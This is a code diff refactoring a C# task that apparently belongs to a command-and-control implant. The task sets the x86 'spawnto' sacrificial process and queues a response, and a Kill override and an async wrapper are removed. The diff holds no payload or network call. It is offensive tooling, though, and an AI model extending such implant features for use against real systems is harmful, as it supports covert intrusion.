@@ -35,31 +35,27 @@ namespace Tasks
         {
         }
 
-        public override void Kill()
-        {
-            base.Kill();
-        }
 
-        public override ST.Task CreateTasking()
+
+        public override void Start()
         {
-            return new ST.Task(() =>
+            TaskResponse resp;
+            SpawnToArgsx86 parameters = _jsonSerializer.Deserialize<SpawnToArgsx86>(_data.Parameters);
+            if (_agent.GetProcessManager().SetSpawnTo(parameters.Application, parameters.Arguments, false))
             {
-                TaskResponse resp;
-                SpawnToArgsx86 parameters = _jsonSerializer.Deserialize<SpawnToArgsx86>(_data.Parameters);
-                if (_agent.GetProcessManager().SetSpawnTo(parameters.Application, parameters.Arguments, false))
-                {
-                    var sacParams = _agent.GetProcessManager().GetStartupInfo();
-                    resp = CreateTaskResponse(
-                        $"x86 Startup Information set to: {sacParams.Application} {sacParams.Arguments}",
-                        true);
-                } else
-                {
-                    resp = CreateTaskResponse("Failed to set startup information.", true, "error");
-                }
-                // Your code here..
-                // Then add response to queue
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+                var sacParams = _agent.GetProcessManager().GetStartupInfo();
+                resp = CreateTaskResponse(
+                    $"x86 Startup Information set to: {sacParams.Application} {sacParams.Arguments}",
+                    true);
+            }
+            else
+            {
+                resp = CreateTaskResponse("Failed to set startup information.", true, "error");
+            }
+
+            // Your code here..
+            // Then add response to queue
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
 }
